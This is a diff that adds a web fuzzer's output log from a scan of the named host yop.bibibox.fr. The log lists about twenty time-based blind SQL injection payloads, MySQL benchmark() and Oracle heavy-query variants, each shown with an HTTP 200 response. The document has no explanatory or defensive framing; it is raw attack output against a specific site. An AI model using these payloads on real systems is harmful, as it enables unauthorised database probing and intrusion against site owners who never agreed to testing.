@@ -1,0 +1,36 @@
+ __    __     _           __ 
+/ / /\ \ \___| |__   ___ / _|
+\ \/  \/ / _ \ '_ \ / _ \ |_ 
+ \  /\  /  __/ |_) |  __/  _|
+  \/  \/ \___|_.__/ \___|_| 
+
+- Web fuzzer
+- Target Hostame: yop.bibibox.fr
+- Target Port: 80
+- Use SSL : No
+- Fuzz Type : file
+- Size : 191
+____________________________________________________________________
+
+ Code 		   size 			     FUZZ
+____________________________________________________________________
+*  14 [200]	   2241 	  and (benchmark(4000000,md5(1))) --%20
+*  15 [200]	   2241 	  and (benchmark(4000000,md5(1))) -- 
+*  17 [200]	   2241 	  and (benchmark(4000000,md5(1)))
+*  26 [200]	   2241 	  or (benchmark(4000000,md5(1))) --%20
+*  30 [200]	   2241 	  or (benchmark(4000000,md5(1)))
+*  31 [200]	   2241 	  or (benchmark(4000000,md5(1))) -- 
+*  36 [200]	   2241 	  and select (benchmark(4000000,md5(1)))
+*  41 [200]	   2241 	  and select (benchmark(4000000,md5(1)))
+*  42 [200]	   2241 	  and select (benchmark(4000000,md5(1))) -- 
+*  43 [200]	   2241 	  and select (benchmark(4000000,md5(1))) --%20
+*  44 [200]	   2241 	  or select (benchmark(4000000,md5(1)))
+*  45 [200]	   2241 	  or select (benchmark(4000000,md5(1))) --%20
+*  47 [200]	   2241 	  or select (benchmark(4000000,md5(1))) -- 
+* 162 [200]	   2241 	  select 1 from dual where (select count(*) from user_catalog,user_catalog,user_catalog,user_catalog)=0 -- 
+* 164 [200]	   2241 	  1=(select 1 from dual where (select count(*) from user_catalog,user_catalog,user_catalog,user_catalog)=0) -- 
+* 165 [200]	   2241 	  and 1=(select 1 from dual where (select count(*) from user_catalog,user_catalog,user_catalog,user_catalog)=0) -- 
+* 176 [200]	   2241 	  and 1=(select 1 from dual where (select count(*) from user_catalog,user_catalog,user_catalog,user_catalog)=0)  
+* 179 [200]	   2241 	  select 1 from dual where (select count(*) from user_catalog,user_catalog,user_catalog,user_catalog)=0 
+* 180 [200]	   2241 	  1=(select 1 from dual where (select count(*) from user_catalog,user_catalog,user_catalog,user_catalog)=0)  
+                                                                                       				 
